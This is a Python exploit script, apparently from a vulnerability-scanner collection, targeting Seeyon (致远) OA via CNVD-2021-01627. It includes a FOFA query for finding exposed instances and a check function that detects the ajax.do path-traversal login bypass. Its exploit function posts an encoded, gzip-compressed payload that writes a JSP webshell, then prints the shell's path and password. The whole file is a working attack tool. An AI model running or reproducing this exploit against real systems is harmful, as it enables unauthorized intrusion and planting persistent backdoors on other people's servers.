#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import sys
import requests

from Config.config_proxies import proxies
from Config.config_requests import ua

requests.packages.urllib3.disable_warnings()
# 脚本信息
######################################################
NAME='CNVD-2021-01627'
AUTHOR="Joker"
REMARK='致远OA ajax.do登录绕过 任意文件上传'
FOFA_RULE='title="致远"'
######################################################

def poc(target):
    result = {}
    test_url1 = target + "/seeyon/thirdpartyController.do.css/..;/ajax.do"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36",
    }
    try:

        r = requests.get(url=test_url1, headers=headers, verify=False, timeout=5,proxies=proxies)
        if 'java.lang.NullPointerException:null' in r.text:
            result['target'] = target
            result['poc'] = NAME
            return result
    except:
        pass

def exp(target):
    print('\033[32m[#]开始写入webshell')
    test_url2 = target + "/seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip"
    headers={
    "User-Agent": ua,
    "Content-Type": "application/x-www-form-urlencoded",
    }
    data="managerMethod=validate&arguments=%1F%C2%8B%08%00%C3%9F%C2%8B%C3%B6%60%00%C3%BFuT%5Bs%C2%AA%C3%88%13%7F%C3%9FOa%C3%B9bR9k%10%C3%A4%18%C3%BF%C2%A7%C3%B6%21%5E%40D%C2%89%C2%82r%C3%BB%C3%97%3E%C3%80%0C%C3%A1%C3%A2%0C%C2%B0%0E%20c%C3%AA%7C%C3%B73%C2%80%C2%A9%C3%A4%C3%94fy%C2%99%C2%9E%C2%A6%C3%BB7%C3%9D%C2%BF%C2%BE%C3%BC%C3%BFm%C3%B0%C2%9A%C2%9Dq%C2%89%C2%BC%03%C3%8D%C2%83%C3%81%C3%BFz%C2%A3o%C2%BDw%C2%8D%C3%A6%C3%A1F3%28%02R%0C%3E%C3%94%C3%8B%3A%3F%07%C2%84%C3%84Y%C3%9A%C3%BC4%C2%8As%C2%9C%C2%86%C2%BD%C3%9C%2B%C2%A2%C3%9E%5F%C2%BD%C3%BEp%C3%B8x%09%7C%2F%C3%8F%C3%89%23%09%02%C2%9A%C2%A5%C2%8F%C3%BD%1F%7F%C3%B4n%5F%C3%A2U%C3%9E0%C3%8E%C2%86%3B%C3%A6RX%C3%A7%C2%B8%08%C3%8E%C2%BD%C3%BCC%C3%A6%19%40%1A%5C%C2%BE2%C2%BBk%C3%B0%1F%C3%BA%C2%92%C2%87%C2%8A%26%C2%8AaB%C3%B2%C2%BA%7F%C3%BF%C2%81%7C%C2%8B%C2%82D%01BM%18%3B9%C2%BF%C2%82EN%7D%7E%C3%8A%29%C2%AB%C2%A8%C3%B0e%C3%B1%C3%BA%C2%82%1B%1D%17%7B%2B%C2%9D%03%C2%8B%C2%AC%C3%9A%C3%B0y%04%C3%B1%C2%B2%04%C2%82Yn%C2%B0V%C3%B9%C3%86T%3D%C2%8E%C2%9E%C2%AB%C2%A3%2C%C2%A5%C2%AE%C2%A1%C2%84%10%C2%9B%14%C3%B0%C2%A8%C3%B2%13%2E%C3%9E%1Ac%C2%AA%24%C3%A3%27%2F%C3%95%2E%2FX%C3%8F%016%13%28%23%C3%9E5%C3%84%C2%8BcA%C2%A4%C3%88%C2%A8%00%C3%B2%C2%94%C3%82%06%1FK%C2%BCc%C2%88%23%C3%B6%C2%9Fl%C3%A2%C2%8C%C2%B4w%3B%2C%1Da%2D%C2%82%C2%95%5E%7D%C2%A9c%C2%B8%C2%AE%C2%B5%2D%C3%95X%C2%A9vI%C3%BD%0F%10%C2%9E%C2%BF%C2%BB%C2%B2%C2%99%C3%B8%C2%B2D%1D%5B%C3%8F%7D%7E%C3%BC%C2%A0%C3%88%1Aql%C3%AD%C2%AAH%C3%87%C3%90%C2%B5%23%C3%8E%C2%B5%C3%84%13%C2%A0%C2%B3%05%C2%B3%C2%B9%02%C2%AE%C2%AE%1CKG%20%2DLu%C3%99%C3%99%1D%C3%A4i%C3%840%C2%A8%22o%C3%B3%40%C3%90F%C2%80%C3%89%2A%C2%93%5F%C2%84%C3%91%05Zk%C3%A2Y%C3%9Bp%C3%8F%C3%97%11%10%C2%B6%C2%A1K%C2%A38%C2%B0u%C2%A4H%05tb4a%C3%B9q%C3%90%5E%C2%97%C3%8A%C2%AA%C3%B3%C3%9B%60%1D%C2%B9%18%C2%95%C3%AE%C2%B1%C3%83Ve%C2%85l%C3%A7u%C2%BC%C3%815%C3%B21%C3%A4%C2%BC%C3%B9i%C3%B2jsO%C2%8C%C3%93%C2%86%C3%B7%C2%93k5v%C3%AB%C2%88q%C3%80%C3%B8%C2%BB%C3%B1%C2%96j%09%C3%80%C3%A8%02%C3%A5%1A%C3%81%C2%85x%C2%80%C2%ABu%C3%AEc%10zW%C3%86%2F%C2%BF%15%C2%B5D%C3%82%C3%9A%02%C2%9D4%C3%8B%C2%8D%5E%0En%C2%A2%19%C3%8A%04%C3%B0%C3%A6%C2%B5%C2%ADA%2C%5E%C2%A0%C2%AD%5B%C2%8EU%C2%8F%5C%23%C2%8C%C2%A1%C2%A1%10%C2%8F%C2%9E%26%7B%1E%5D%C2%BC%2E%C3%87%C3%A9%C2%BB%C2%BC%C3%81%10%C3%81%25bu%C3%95%23%1FkH%C2%9D%C2%AFg%C2%BA%C2%B9%C2%8D%C3%95C%C2%91lX%0E%C2%9E%C2%BD%C3%8F%C2%B6q%5D%C2%BA6%08%C2%8F%C2%BC%C3%89b29%C2%837%C3%85%C2%A30C%0E%0D%C2%B3Oo%C2%A6%C3%AE%C3%AFo%C3%A6%2AUb%C3%95h%C3%B5%C3%B3%C2%86%2F%40%C3%83%7C%C3%B3%C2%8Eo%C2%9C%26%3E6%05V%C2%9F%0C%C3%8AQ%0Ehk%C3%97%C3%95%C2%A7%C2%B1k%C3%A3%C3%BA%C2%BD6%C3%AA%C3%BC%C3%84%C3%B4%20s%C2%A8x%C3%B29%C2%97%C3%B1%21%11U%16%11%C2%A4%C2%B3%2B%C2%B4%C3%86%C2%A5o%C2%A1%2B%C3%BB7%C3%9F%C2%9B%C2%9A%C2%A4%25%C3%BA%C2%92%C3%B1Z%C3%9D%C3%BC%C3%8A%C2%B6%3Fx%1D%C3%ADS%13%C2%BB%C2%ACW%C3%95%C3%95%1A%01%C3%9BD%40%C3%98%C2%97%2EorGl%C2%BE%C2%BFQ%C2%B2%1C%23%C2%97%0D%C2%AE%C2%8F%C2%8F%19%C2%8B3g9%C2%B0%C3%BC%C3%A1%C3%9AO5%C3%8E%C2%B1%C3%84%C2%84%C3%A5%C3%87%C3%A20khI%04%C3%90%C2%A8%C3%AD%C3%A9%3D%3F%2D%C2%A1l%C2%8E%21%C2%AB%C3%ADn%3Em%7B%12%C3%B0%1A%C3%B5%C3%AC%19%C3%A7%C3%8B%26%C2%B7K%2EUW%C3%97u%C3%A5%0B%C3%BB%C2%87O%C2%83N%C3%8At%C2%88c%02%C2%86%C2%B3gc%C3%B9%7D%C2%BC%08%40%06%C3%99%C2%AC%C3%83%C3%9B%C3%99%C2%8D%C3%B9%C3%97Fw%C3%BF%C2%9E%C3%AA%C3%8E%C3%ADv%C3%A9%7C%C2%BB%C3%8B%C3%9D%0Dp%C3%98%C2%9D%C2%B3%C3%B2%C3%B5%C2%95%01%C2%B4K%C3%A0%C3%BE%5B%C3%BFx%C2%90%C3%BE%7C%C3%BA%C2%BC%24%3E%C2%AF%C2%9Aa%7BA%C3%A9%0D%C2%A2%C3%83%C3%BB%2F%5B%C2%802%12%C2%B0%C3%80%7E%C3%BEhV%21%13%60%C3%B0%C3%9A%23%C2%85W%C3%84%C2%A0W%C3%97%C3%B5%C3%9D%C3%BD%C3%9B%C3%A0%27%C3%9B%C2%8FlG%C2%BE5gq%2E%C2%83%C3%81%C3%9F%C2%BF%00%26%C2%ABR%C3%89Z%05%00%00"
    r = requests.post(url=test_url2,headers=headers,data=data,verify=False,timeout=5,proxies=proxies)
    if r.status_code==500 and '"message":null' in r.text:
        print('\033[32m[#]成功写入webshell')
        print('webshell地址：'+target+'/seeyon/Faltform.jspx'+'\n'+'[32m[#]密码：szxsd')
    else:
        print('[32m[#]写入webshell失败')


if __name__ == '__main__':
    poc("https://127.0.0.1")